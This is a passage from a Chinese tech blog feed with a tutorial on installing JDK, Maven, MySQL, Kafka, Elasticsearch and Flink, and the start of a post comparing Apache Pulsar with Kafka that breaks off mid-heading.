JDK 的安装目录在 <code>/Library/Java/JavaVirtualMachines/</code> ，然后在 <code>/etc/hosts</code> 中配置好环境变量（注意：替换你自己电脑本地的路径）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_152.jdk/Contents/Home</span><br><span class="line">export CLASSPATH=$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib/dt.jar:</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br></pre></td></tr></table></figure><p>Linux 系统的话就是在某个目录下直接解压就行了，然后在 <code>/etc/profile</code> 添加一下上面的环境变量（注意：替换你自己电脑的路径）。</p><p>然后执行 <code>java -version</code> 命令可以查看是否安装成功！</p><p> zhisheng@zhisheng ~  java -version<br>java version “1.8.0_152”<br>Java(TM) SE Runtime Environment (build 1.8.0_152-b16)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.152-b16, mixed mode)</p><h3 id="Maven-安装与配置"><a href="#Maven-安装与配置" class="headerlink" title="Maven 安装与配置"></a>Maven 安装与配置</h3><p>安装好 JDK 后我们就可以安装 Maven 了，我们在<a href="http://maven.apache.org/download.cgi" target="_blank" rel="noopener">官网</a>下载二进制包就行，然后在自己本地软件安装目录解压压缩包就行。</p><p>接下来你需要配置一下环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export M2_HOME=/Users/zhisheng/Documents/maven-3.5.2</span><br><span class="line">export PATH=$PATH:$M2_HOME/bin</span><br></pre></td></tr></table></figure><p>然后执行命令 <code>mvn -v</code> 可以验证是否安装成功，结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zhisheng@zhisheng ~ /Users  mvn -v</span><br><span class="line">Apache Maven 3.5.2 (138edd61fd100ec658bfa2d307c43b76940a5d7d; 2017-10-18T15:58:13+08:00)</span><br><span class="line">Maven home: /Users/zhisheng/Documents/maven-3.5.2</span><br><span class="line">Java version: 1.8.0_152, vendor: Oracle Corporation</span><br><span class="line">Java home: /Library/Java/JavaVirtualMachines/jdk1.8.0_152.jdk/Contents/Home/jre</span><br><span class="line">Default locale: zh_CN, platform encoding: UTF-8</span><br><span class="line">OS name: &quot;mac os x&quot;, version: &quot;10.13.5&quot;, arch: &quot;x86_64&quot;, family: &quot;mac&quot;</span><br></pre></td></tr></table></figure><h3 id="IDE-安装与配置"><a href="#IDE-安装与配置" class="headerlink" title="IDE 安装与配置"></a>IDE 安装与配置</h3><p>安装完 JDK 和 Maven 后，就可以安装 IDE 了，大家可以选择你熟练的 IDE 就行，我后面演示的代码都是在 IDEA 中运行的，如果想为了后面不出其他的 问题的话，建议尽量和我的环境保持一致。</p><p>IDEA 官网下载地址：<a href="https://www.jetbrains.com/idea/download/#section=mac" target="_blank" rel="noopener">下载页面的地址</a></p><p>下载后可以双击后然后按照提示一步步安装，安装完成后需要在 IDEA 中配置 JDK 路径和 Maven 的路径，后面我们开发也都是靠 Maven 来管理项目的依赖。</p><h3 id="MySQL-安装与配置"><a href="#MySQL-安装与配置" class="headerlink" title="MySQL 安装与配置"></a>MySQL 安装与配置</h3><p>因为后面文章有用到 MySQL，所以这里也讲一下如何安装与配置，首先去官网下载 MySQL 5.7，<a href="https://dev.mysql.com/downloads/mysql/5.7.html#downloads" target="_blank" rel="noopener">下载页面的地址</a>，根据你们到系统安装对应的版本，Mac 的话双击 dmg 安装包就可以按照提示一步步执行到安装成功。</p><p>启动 MySQL，如下图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pndeozfuj20u0130dll.jpg" alt="undefined"></p><p>出现绿色就证明 MySQL 服务启动成功了。后面我们操作数据库不会通过本地命令行来，而是会通过图形化软件，比如：Navicat、Sequel pro，这些图形化软件可比命令行的效率高太多，读者可以自行下载安装一下。</p><h3 id="Kafka-安装与配置"><a href="#Kafka-安装与配置" class="headerlink" title="Kafka 安装与配置"></a>Kafka 安装与配置</h3><p>后面我们文章中会大量用到 Kafka，所以 Kakfa 一定要安装好。官网下载地址：<a href="https://kafka.apache.org/downloads" target="_blank" rel="noopener">下载页面的地址</a></p><p>同样，我自己下载的版本是 1.1.0 （保持和我公司的生产环境一致），如果你对 Kafka 还不太熟悉，可以参考我以前写的一篇入门文章：<a href="http://www.54tianzhisheng.cn/2018/01/04/Kafka/" target="_blank" rel="noopener">Kafka 安装及快速入门</a>。</p><p>在这篇文章里面教大家怎么安装 Kafka、启动 Zookeeper、启动 Kafka 服务、创建 Topic、使用 producer 创建消息、使用 consumer 消费消息、查看 Topic 的信息，另外还有提供集群配置的方案。</p><h3 id="ElasticSearch-安装与配置"><a href="#ElasticSearch-安装与配置" class="headerlink" title="ElasticSearch 安装与配置"></a>ElasticSearch 安装与配置</h3><p>因为后面有文章介绍连接器 (connector) —— Elasticsearch 介绍和整和使用，并且最后面的案例文章也会把数据存储在 Elasticsearch 中的，所以这里就简单的讲解一下 Elasticsearch 的安装，在我以前的博客中写过一篇搭建 Elasticsearch 集群的：<a href="http://www.54tianzhisheng.cn/2017/09/09/Elasticsearch-install/" target="_blank" rel="noopener">Elasticsearch 系列文章（二）：全文搜索引擎 Elasticsearch 集群搭建入门教程</a>。</p><p>这里我在本地安装个单机的 Elasticsearch 就行了，首先在官网 <a href="https://www.elastic.co/cn/downloads/past-releases" target="_blank" rel="noopener">下载页面</a> 找到 Elasticsearch 产品，我下载的版本是 elasticsearch-6.3.2 版本，同样和我们公司的线上环境版本保持一致，因为 Flink Elasticsearch connector 有分好几个版本：2.x、5.x、6.x 版本，不同版本到时候写数据存入到 Elasticsearch 的 Job 代码也是有点区别的，如果你们公司的 Elasticsearch 版本比较低的话，到时候后面版本的学习代码还得找官网的资料对比学习一下。</p><p>另外就是写这篇文章的时候 Elasticsearch 7.x 就早已经发布了，Flink 我暂时还没看到支持 Elasticsearch 7 的连接器，自己也没测试过，所以暂不清楚如果用 6.x 版本的 connector 去连接 7.x 的 Elasticsearch 会不会出现问题？建议还是跟着我的安装版本来操作！</p><p>除了这样下载 Elasticsearch 的话，你如果电脑安装了 Homebrew，也可以通过 Homebrew 来安装 Elasticsearch，都还挺方便的，包括你还可以通过 Docker 的方式快速启动一个 Elasticsearch 来。</p><p>下载好了 Elasticsearch 的压缩包，在你的安装目录下解压就行了，然后进入 Elasticsearch 的安装目录执行下面命令就可以启动 Elasticsearch 了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></figure><p>执行命令后的结果：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pne4yctlj24m02d04qp.jpg" alt="undefined"></p><p>从浏览器端打开地址：<code>http://localhost:9200/</code> 即可验证是否安装成功：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pnejkllpj20t60qsdhg.jpg" alt="undefined"></p><p>如果出现了如上图这样就代表 Elasticsearch 环境已经安装好了。</p><h3 id="小结与反思-3"><a href="#小结与反思-3" class="headerlink" title="小结与反思"></a>小结与反思</h3><p>本节讲解了下 JDK、Maven、IDE、MySQL、Kafka、ElasticSearch 的安装与配置，因为这些都是后面要用的，所以这里单独抽一篇文章来讲解环境准备的安装步骤，当然这里还并不涉及全，因为后面我们还可能会涉及到 HBase、HDFS 等知识，后面我们用到再看，我们本系列的文章更多的还是讲解 Flink，所以更多的环境准备还是得靠大家自己独立完成。</p><p>这里我说下笔者自己一般安装环境的选择：</p><ol><li>组件尽量和公司的生产环境保持版本一致，不追求太新，够用就行，这样如果生产出现问题，本机还可以看是否可以复现出来</li><li>安装环境的时候先搜下类似的安装教程，提前知道要踩的坑，避免自己再次踩到</li></ol><p>下面文章我们就正式进入 Flink 专题了！</p><h2 id="五、Flink环境搭建"><a href="#五、Flink环境搭建" class="headerlink" title="五、Flink环境搭建"></a>五、Flink环境搭建</h2><p>在 2.1 节中已经将 Flink 的准备环境已经讲完了，本篇文章将带大家正式开始接触 Flink，那么我们得先安装一下 Flink。Flink 是可以在多个平台（Windows、Linux、Mac）上安装的。在开始写本书的时候最新版本是 1.8 版本，但是写到一半后更新到 1.9 了（合并了大量 Blink 的新特性），所以笔者又全部更新版本到 1.9，书籍后面也都是基于最新的版本讲解与演示。</p><p>Flink 的官网地址是：<a href="https://flink.apache.org/" target="_blank" rel="noopener">https://flink.apache.org/</a></p><h3 id="Flink-下载与安装"><a href="#Flink-下载与安装" class="headerlink" title="Flink 下载与安装"></a>Flink 下载与安装</h3><h4 id="Mac-amp-Linux-安装"><a href="#Mac-amp-Linux-安装" class="headerlink" title="Mac &amp; Linux 安装"></a>Mac &amp; Linux 安装</h4><p>你可以通过该地址 <a href="https://flink.apache.org/downloads.html" target="_blank" rel="noopener">https://flink.apache.org/downloads.html</a> 下载到最新版本的 Flink。</p><p>这里我们选择 <code>Apache Flink 1.9.0 for Scala 2.11</code> 版本，点击跳转到了一个镜像下载选择的地址，随便选择哪个就行，只是下载速度不一致而已。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pnl2lqdzj21y417i0wa.jpg" alt="undefined"></p><p>下载完后，你就可以直接解压下载的 Flink 压缩包了。</p><p>接下来我们可以启动一下 Flink，我们进入到 Flink 的安装目录下执行命令 <code>./bin/start-cluster.sh</code> 即可，产生的日志如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zhisheng@zhisheng /usr/local/flink-1.9.0  ./bin/start-cluster.sh</span><br><span class="line">Starting cluster.</span><br><span class="line">Starting standalonesession daemon on host zhisheng.</span><br><span class="line">Starting taskexecutor daemon on host zhisheng.</span><br></pre></td></tr></table></figure><p>如果你的电脑是 Mac 的话，那么你也可以通过 Homebrew 命令进行安装。先通过命令 <code>brew search flink</code> 查找一下包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> zhisheng@zhisheng  ~  brew search flink</span><br><span class="line">==&gt; Formulae</span><br><span class="line">apache-flink ✔       homebrew/linuxbrew-core/apache-flink</span><br></pre></td></tr></table></figure><p>可以发现找得到 Flink 的安装包，但是这样安装的版本可能不是最新的，如果你要安装的话，则使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install apache-flink</span><br></pre></td></tr></table></figure><p>那么它就会开始进行下载并安装好，安装后的目录应该是在 <code>/usr/local/Cellar/apache-flink</code> 下。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pnmiv3uoj21fi106q8b.jpg" alt="undefined"></p><p>你可以通过下面命令检查安装的 Flink 到底是什么版本的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flink --version</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Version: 1.9.0, Commit ID: ff472b4</span><br></pre></td></tr></table></figure><p>这种的话运行是得进入 <code>/usr/local/Cellar/apache-flink/1.9.0/libexec/bin</code> 目录下执行命令 <code>./start-cluster.sh</code> 才可以启动 Flink 的。</p><p>启动后产生的日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Starting cluster.</span><br><span class="line">Starting standalonesession daemon on host zhisheng.</span><br><span class="line">Starting taskexecutor daemon on host zhisheng.</span><br></pre></td></tr></table></figure><h4 id="Windows-安装"><a href="#Windows-安装" class="headerlink" title="Windows 安装"></a>Windows 安装</h4><p>如果你的电脑系统是 Windows 的话，那么你就直接双击 Flink 安装目录下面 bin 文件夹里面的 <code>start-cluster.bat</code> 就行，同样可以将 Flink 起动成功。</p><h3 id="Flink-启动与运行"><a href="#Flink-启动与运行" class="headerlink" title="Flink 启动与运行"></a>Flink 启动与运行</h3><p>启动成功后的话，我们可以通过访问地址<code>http://localhost:8081/</code> 查看 UI 长啥样了，如下图所示：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pnneh4l3j228o1j6myu.jpg" alt="undefined"></p><p>你在通过 jps 命令可以查看到运行的进程有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zhisheng@zhisheng  /usr/local/flink-1.9.0  jps</span><br><span class="line">73937 StandaloneSessionClusterEntrypoint</span><br><span class="line">74391 Jps</span><br><span class="line">520</span><br><span class="line">74362 TaskManagerRunner</span><br></pre></td></tr></table></figure><h3 id="Flink-目录配置文件解读"><a href="#Flink-目录配置文件解读" class="headerlink" title="Flink 目录配置文件解读"></a>Flink 目录配置文件解读</h3><p>Flink 安装好后，我们也运行启动看了效果了，接下来我们来看下它的目录结构吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> ✘ zhisheng@zhisheng  /usr/local/flink-1.9.0  ll</span><br><span class="line">total 1200</span><br><span class="line">-rw-r--r--@  1 zhisheng  staff    11K  3  5 16:32 LICENSE</span><br><span class="line">-rw-r--r--@  1 zhisheng  staff   582K  4  4 00:01 NOTICE</span><br><span class="line">-rw-r--r--@  1 zhisheng  staff   1.3K  3  5 16:32 README.txt</span><br><span class="line">drwxr-xr-x@ 26 zhisheng  staff   832B  3  5 16:32 bin</span><br><span class="line">drwxr-xr-x@ 14 zhisheng  staff   448B  4  4 14:06 conf</span><br><span class="line">drwxr-xr-x@  6 zhisheng  staff   192B  4  4 14:06 examples</span><br><span class="line">drwxr-xr-x@  5 zhisheng  staff   160B  4  4 14:06 lib</span><br><span class="line">drwxr-xr-x@ 47 zhisheng  staff   1.5K  3  6 23:21 licenses</span><br><span class="line">drwxr-xr-x@  2 zhisheng  staff    64B  3  5 19:50 log</span><br><span class="line">drwxr-xr-x@ 22 zhisheng  staff   704B  4  4 14:06 opt</span><br></pre></td></tr></table></figure><p>上面目录：</p><ul><li><strong>bin</strong> 存放一些启动脚本</li><li><strong>conf</strong> 存放配置文件</li><li><strong>examples</strong> 存放一些案例的 Job Jar 包</li><li><strong>lib</strong> Flink 依赖的 Jar 包</li><li><strong>log</strong> 存放产生的日志文件</li><li><strong>opt</strong> 存放的是一些可选择的 Jar 包，后面可能会用到</li></ul><p>在 bin 目录里面有如下这些脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">zhisheng@zhisheng  /usr/local/flink-1.9.0  ll bin</span><br><span class="line">total 256</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff    28K  3  5 16:32 config.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   2.2K  3  5 16:32 flink</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   2.7K  3  5 16:32 flink-console.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   6.2K  3  5 16:32 flink-daemon.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.2K  3  5 16:32 flink.bat</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.5K  3  5 16:32 historyserver.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   2.8K  3  5 16:32 jobmanager.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.8K  3  5 16:32 mesos-appmaster-job.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.8K  3  5 16:32 mesos-appmaster.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.8K  3  5 16:32 mesos-taskmanager.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.2K  3  5 16:32 pyflink-stream.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.1K  3  5 16:32 pyflink.bat</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.1K  3  5 16:32 pyflink.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   3.4K  3  5 16:32 sql-client.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   2.5K  3  5 16:32 standalone-job.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   3.3K  3  5 16:32 start-cluster.bat</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.8K  3  5 16:32 start-cluster.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   3.3K  3  5 16:32 start-scala-shell.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.8K  3  5 16:32 start-zookeeper-quorum.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.6K  3  5 16:32 stop-cluster.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.8K  3  5 16:32 stop-zookeeper-quorum.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   3.8K  3  5 16:32 taskmanager.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   1.6K  3  5 16:32 yarn-session.sh</span><br><span class="line">-rwxr-xr-x@ 1 zhisheng  staff   2.2K  3  5 16:32 zookeeper.sh</span><br></pre></td></tr></table></figure><p>脚本包括了配置启动脚本、historyserver、Job Manager、Task Manager、启动集群和停止集群等脚本。</p><p>在 conf 目录下面有如下这些配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">zhisheng@zhisheng  /usr/local/flink-1.9.0  ll conf</span><br><span class="line">total 112</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff   9.8K  4  4 00:01 flink-conf.yaml</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff   2.1K  3  5 16:32 log4j-cli.properties</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff   1.8K  3  5 16:32 log4j-console.properties</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff   1.7K  3  5 16:32 log4j-yarn-session.properties</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff   1.9K  3  5 16:32 log4j.properties</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff   2.2K  3  5 16:32 logback-console.xml</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff   1.5K  3  5 16:32 logback-yarn.xml</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff   2.3K  3  5 16:32 logback.xml</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff    15B  3  5 16:32 masters</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff    10B  3  5 16:32 slaves</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff   3.8K  3  5 16:32 sql-client-defaults.yaml</span><br><span class="line">-rw-r--r--@ 1 zhisheng  staff   1.4K  3  5 16:32 zoo.cfg</span><br></pre></td></tr></table></figure><p>配置包含了 Flink 的自身配置、日志配置、masters、slaves、sql-client、zoo 等配置。</p><p>在 examples 目录里面可以看到有如下这些案例的目录：</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;大数据实时计算引擎-Flink-实战与性能优化&quot;&gt;&lt;a href=&quot;#大数据实时计算引擎-Flink-实战与性能优化&quot; class=&quot;headerlink&quot; title=&quot;大数据实时计算引擎 Flink 实战与性能优化&quot;&gt;&lt;/a&gt;大数据实时计算引擎 Flink 实战与性能优化&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Flink作为流处理方案的最佳选择，还有流处理 批处理大一统之势，可谓必知必会&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/bec9bff2ly1g9a0z5j7i6j20bp04tdgk.jpg&quot; alt=&quot;undefined&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://yoursite.com/categories/Flink/"/>
    
    
      <category term="Flink" scheme="http://yoursite.com/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Pulsar与Kafka对比</title>
    <link href="http://yoursite.com/2019/11/07/Pulsar%E4%B8%8EKafka%E5%AF%B9%E6%AF%94/"/>
    <id>http://yoursite.com/2019/11/07/Pulsar与Kafka对比/</id>
    <published>2019-11-07T06:57:42.500Z</published>
    <updated>2019-11-25T01:42:49.810Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pulsar与Kafka对比"><a href="#Pulsar与Kafka对比" class="headerlink" title="Pulsar与Kafka对比"></a>Pulsar与Kafka对比</h1><blockquote><p>Pulsar 是一个比较新的MQ，和MQ的王者Kafka进行对比。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9a1gg550rj20y107tq3l.jpg" alt="TIM截图20191125094052.png"></p><a id="more"></a> <h2 id="Pulsar架构"><a href="#Pulsar架构" class="headerlink" title="Pulsar架构"></a>Pulsar架构</h2><p>Apache Pulsar 是一个企业级的分布式消息系统，最初由 Yahoo 开发，在 2016 年开源，并于2018年9月毕业成为 Apache 基金会的顶级项目。Pulsar 已经在 Yahoo 的生产环境使用了三年多，主要服务于Mail、Finance、Sports、 Flickr、 the Gemini Ads platform、 Sherpa (Yahoo 的 KV 存储)。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8ph5xgvnyj20m80epjx9.jpg" alt="undefined"></p><h2 id="kafka队列优先级模型"><a href="#kafka队列优先级模型" class="headerlink" title="kafka队列优先级模型"></a>kafka队列优先级模型</h2><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8ph3n5p4wj20m80j4gsu.jpg" alt="undefined"></p><p>在该方案中，个推将优先级统一设定为高、中、低三个级别。具体操作方案如下：</p><ol><li>对某个优先级根据 task (单次推送任务)维度，存入不同的 Topic，一个 task 只写入一个 Topic，一个 Topic 可存多个 task；</li><li>消费模块根据优先级配额(如 6:3:1)，获取不同优先级的消息数，同一优先级轮询获取消息；这样既保证了高优先级用户可以更快地发送消息，又避免了低优先级用户出现没有下发的情况。</li></ol><h2 id="Kafka方案遇到的问题"><a href="#Kafka方案遇到的问题" class="headerlink" title="Kafka方案遇到的问题"></a>Kafka方案遇到的问题</h2><p>随着个推业务的不断发展，接入的 APP 数量逐渐增多，第一版的优先级方案也逐渐暴露出一些问题：</p><ol><li>当相同优先级的 APP 在同一时刻推送任务越来越多时，后面进入的 task 消息会因为前面 task 消息还存在队列情况而出现延迟。如下图所示, 当 task1 消息量过大时，在task1 消费结束前，taskN 将一直处于等待状态。</li></ol><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8ph4vwowhj20gz01pa9t.jpg" alt="undefined"></p><ol><li>Kafka 在 Topic 数量由 64 增长到 256 时，吞吐量下降严重，Kafka 的每个 Topic、每个分区都会对应一个物理文件。当 Topic 数量增加时，消息分散的落盘策略会导致磁盘 IO 竞争激烈，因此我们不能仅通过增加 Topic 数量来缓解第一点中的问题。</li></ol><p>基于上述问题，需要可以创建大量的 Topic, 同时吞吐性能不能比 Kafka 逊色。经过一段时间的调研，Apache Pulsar 引起了我们的关注。</p><h2 id="Topic数量"><a href="#Topic数量" class="headerlink" title="Topic数量"></a>Topic数量</h2><p>Pulsar 可以支持百万级别 Topic 数量的扩展，同时还能一直保持良好的性能。Topic 的伸缩性取决于它的内部组织和存储方式。Pulsar 的数据保存在 bookie (BookKeeper 服务器)上，处于写状态的不同 Topic 的消息，在内存中排序，最终聚合保存到大文件中，在 Bookie 中需要更少的文件句柄。另一方面 Bookie 的 IO 更少依赖于文件系统的 Pagecache，Pulsar 也因此能够支持大量的主题。</p><h2 id="消费模型"><a href="#消费模型" class="headerlink" title="消费模型"></a>消费模型</h2><p>Pulsar 支持三种消费模型：Exclusive、Shared 和Failover。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8ph7te7d2j20m80epjx9.jpg" alt="undefined"></p><p><strong>Exclusive (独享)</strong>：一个 Topic 只能被一个消费者消费。Pulsar 默认使用这种模式。</p><p><strong>Shared(共享)</strong>：共享模式，多个消费者可以连接到同一个 Topic，消息依次分发给消费者。当一个消费者宕机或者主动断开连接时，那么分发给这个消费者的未确认(ack)的消息会得到重新调度，分发给其他消费者。</p><p><strong>Failover (灾备)</strong>：一个订阅同时只有一个消费者，可以有多个备份消费者。一旦主消费者故障，则备份消费者接管。不会出现同时有两个活跃的消费者。</p><p>Exclusive和Failover订阅，仅允许一个消费者来使用和消费每个订阅的Topic。这两种模式都按 Topic 分区顺序使用消息。它们最适用于需要严格消息顺序的流(Stream)用例。</p><p>Shared 允许每个主题分区有多个消费者。同一个订阅中的每个消费者仅接收Topic分区的一部分消息。Shared最适用于不需要保证消息顺序队列(Queue)的使用模式，并且可以按照需要任意扩展消费者的数量。</p><h2 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h2><p>Pulsar 引入了 Apache BookKeeper 作为存储层，BookKeeper 是一个专门为实时系统优化过的分布式存储系统，具有可扩展、高可用、低延迟等特性。具体介绍，请参考 <a href="https://github.com/apache/bookkeeper" target="_blank" rel="noopener">BookKeeper官网</a>。</p><h3 id="Segment"><a href="#Segment" class="headerlink" title="Segment"></a>Segment</h3><p>BookKeeper以 Segment (在 BookKeeper 内部被称作 ledger) 作为存储的基本单元。从 Segment 到消息粒度，都会均匀分散到 BookKeeper 的集群中。这种机制保证了数据和服务均匀分散在 BookKeeper 集群中。</p><p>Pulsar 和 Kafka 都是基于 partition 的逻辑概念来做 Topic 存储的。最根本的不同是，Kafka 的物理存储是以 partition 为单位的，每个 partition 必须作为一个整体(一个目录)存储在某个 broker 上。 而 Pulsar 的 partition 是以 segment 作为物理存储的单位，每个 partition 会再被打散并均匀分散到多个 bookie 节点中。</p><p>这样的直接影响是，Kafka 的 partition 的大小，受制于单台 broker 的存储；而 Pulsar 的 partition 则可以利用整个集群的存储容量。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8ph8z7mslj20zk0f5jww.jpg" alt="undefined"></p><h3 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h3><p>当 partition 的容量达到上限后，需要扩容的时候，如果现有的单台机器不能满足，Kafka 可能需要添加新的存储节点，并将 partition 的数据在节点之间搬移达到 rebalance 的状态。</p><p>而 Pulsar 只需添加新的 Bookie 存储节点即可。新加入的节点由于剩余空间大，会被优先使用，接收更多的新数据；整个扩容过程不涉及任何已有数据的拷贝和搬移。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8ph9lc46zj20m80ifgq8.jpg" alt="undefined"></p><h2 id="Broker故障"><a href="#Broker故障" class="headerlink" title="Broker故障"></a>Broker故障</h2><p>Pulsar 在单个节点失败时也会体现同样的优势。如果 Pulsar 的某个服务节点 broker 失效，由于 broker 是无状态的，其他的 broker 可以很快接管 Topic，不会涉及 Topic 数据的拷贝；如果存储节点 Bookie 失效，在集群后台中，其他的 Bookie 会从多个 Bookie 节点中并发读取数据，并对失效节点的数据自动进行恢复，对前端服务不会造成影响。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pha2rmerj20m80lgtei.jpg" alt="undefined"></p><h2 id="Bookie故障"><a href="#Bookie故障" class="headerlink" title="Bookie故障"></a>Bookie故障</h2><p>Apache BookKeeper 中的副本修复是 Segment (甚至是 Entry)级别的多对多快速修复。这种方式只会复制必须的数据，这比重新复制整个主题分区要精细。如下图所示，当错误发生时， Apache BookKeeper 可以从 bookie 3 和 bookie 4 中读取 Segment 4 中的消息，并在 bookie 1 处修复 Segment 4。所有的副本修复都在后台进行，对 Broker 和应用透明。</p><p>当某个 Bookie 节点出错时，BookKeeper会自动添加可用的新 Bookie 来替换失败的 Bookie，出错的 Bookie 中的数据在后台恢复，所有 Broker 的写入不会被打断，而且不会牺牲主题分区的可用性。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8phagh11tj20m00m8agw.jpg" alt="undefined"></p><h2 id="基于-Pulsar-的优先级队列方案"><a href="#基于-Pulsar-的优先级队列方案" class="headerlink" title="基于 Pulsar 